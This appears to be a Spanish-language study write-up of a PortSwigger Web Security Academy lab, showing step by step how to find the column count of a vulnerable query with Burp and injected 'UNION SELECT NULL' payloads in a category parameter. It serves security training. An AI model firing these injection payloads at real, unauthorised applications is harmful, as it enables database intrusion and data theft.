# Lab 01 — SQL injection UNION attack, determining the number of columns returned by the query

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Determinar cuántas columnas devuelve la consulta SQL vulnerable realizando un `UNION SELECT` que añada una fila formada por valores `NULL`.

URL oficial:

https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

---

# Qué enseña este lab

Antes de usar `UNION` para extraer datos necesitamos que la consulta inyectada tenga el mismo número de columnas que la consulta original.

Conceptualmente:

```sql
consulta_original
UNION
SELECT NULL,NULL,NULL
```

Si la original devuelve 3 columnas, el `UNION SELECT` también debe devolver 3.

---

# Procedimiento oficial paso a paso

## Paso 1 — Abrir un filtro de categoría

En el navegador de Burp abre el lab y selecciona cualquier categoría de producto.

La request será parecida a:

```http
GET /filter?category=Gifts HTTP/2
```

## Paso 2 — Interceptar

En Burp:

```text
Proxy
→ Intercept
→ Intercept is ON
```

Pulsa otra categoría en el navegador para capturar la request.

Localiza el parámetro:

```text
category=...
```

## Paso 3 — Probar una columna

Cambia el valor de `category` por:

```text
'+UNION+SELECT+NULL--
```

Pulsa:

```text
Forward
```

Resultado esperado: **error**.

Eso significa que una columna no coincide con la consulta original.

## Paso 4 — Probar dos columnas

Repite la request y prueba:

```text
'+UNION+SELECT+NULL,NULL--
```

Si sigue dando error, todavía no coincide.

## Paso 5 — Continuar añadiendo NULL

Prueba sucesivamente:

```text
'+UNION+SELECT+NULL,NULL,NULL--
```

Luego, si hiciera falta:

```text
'+UNION+SELECT+NULL,NULL,NULL,NULL--
```

Continúa hasta que **el error desaparezca** y la aplicación responda normalmente con contenido adicional.

En este lab, la cantidad correcta es **3 columnas**.

---

# Request clave

```http
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
```

Semánticamente:

```sql
' UNION SELECT NULL,NULL,NULL--
```

---

# Qué debes observar

No estás buscando un username ni un password todavía.

La señal es:

```text
cantidad incorrecta de columnas
→ error

cantidad correcta
→ respuesta normal
→ lab Solved
```

---

# Por qué funciona

`UNION` combina resultados de dos `SELECT`, pero ambos lados necesitan una estructura compatible.

PortSwigger usa `NULL` porque suele ser compatible con muchos tipos de datos.

```text
1 NULL  → error
2 NULL  → error
3 NULL  → funciona
```

Por inferencia:

```text
consulta original = 3 columnas
```

---

# Burp que tengo que aprender

- interceptar un filtro de categoría;
- identificar `category`;
- editar una query string;
- repetir una prueba incremental;
- distinguir un error de una respuesta válida;
- entender que cada `NULL` representa una columna del `SELECT` inyectado.

## Práctica recomendada después del workflow oficial

Una vez entendido el método con Proxy, manda la request a **Repeater** y repite ahí las pruebas de 1, 2 y 3 columnas. Para pruebas iterativas, Repeater será más cómodo en los labs siguientes.

---

# Checklist

- [ ] Capturé el filtro de categoría.
- [ ] Probé `UNION SELECT NULL--`.
- [ ] Vi el error.
- [ ] Añadí valores `NULL` uno a uno.
- [ ] Encontré que funcionan 3 columnas.
- [ ] Puedo explicar por qué `UNION` necesita el mismo número de columnas.
- [ ] Lab Solved.

# Regla para recordar

```text
UNION primero pregunta:
¿cuántas columnas devuelve la consulta original?
```
